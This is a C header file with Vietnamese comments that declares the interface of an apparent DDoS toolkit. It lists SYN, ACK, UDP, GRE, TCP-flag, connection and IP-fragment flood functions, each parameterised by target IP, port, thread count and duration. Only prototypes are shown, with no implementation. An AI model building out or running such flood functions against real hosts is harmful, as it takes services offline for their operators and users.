/**
 * ddos_layer4.h
 * Khai bao prototype cho cac ham DDoS tang giao van (Layer 4)
 */

#ifndef DDOS_LAYER4_H
#define DDOS_LAYER4_H

/**
 * SYN Flood Attack
 * Gui nhieu goi tin TCP SYN den muc tieu
 * Dau vao: ip_muc_tieu - dia chi IP muc tieu
 *          cong - cong muc tieu
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian tan cong (giay)
 * Tra ve: so goi tin da gui
 */
int syn_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian);

/**
 * ACK Flood Attack
 * Gui nhieu goi tin TCP ACK den muc tieu
 */
int ack_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian);

/**
 * TCP Connection Flood
 * Mo nhieu ket noi TCP day du den muc tieu
 */
int tcp_connection_flood(const char* ip_muc_tieu, int cong, int so_thread, int thoi_gian);

/**
 * UDP Flood Attack
 * Gui nhieu goi tin UDP den muc tieu
 * Dau vao: ip_muc_tieu - dia chi IP muc tieu
 *          cong - cong muc tieu
 *          kich_thuoc_goi - kich thuoc moi goi (bytes)
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian tan cong (giay)
 */
int udp_flood(const char* ip_muc_tieu, int cong, int kich_thuoc_goi, 
              int so_thread, int thoi_gian);

/**
 * TCP Flag Attack (gui goi tin voi cac co dac biet)
 * Dau vao: ip_muc_tieu - dia chi IP
 *          cong - cong muc tieu
 *          co_flags - cac co TCP (SYN,ACK,FIN,RST,PSH,URG)
 *          so_thread - so luong thread
 *          thoi_gian - thoi gian (giay)
 */
int tcp_flag_attack(const char* ip_muc_tieu, int cong, const char* co_flags,
                    int so_thread, int thoi_gian);

/**
 * GRE Flood Attack
 * Gui nhieu goi tin GRE (Generic Routing Encapsulation)
 */
int gre_flood(const char* ip_muc_tieu, int so_thread, int thoi_gian);

/**
 * IP Fragment Attack
 * Gui cac manh IP phan manh gay ton tai nguyen
 */
int ip_fragment_attack(const char* ip_muc_tieu, int so_thread, int thoi_gian);

#endif /* DDOS_LAYER4_H */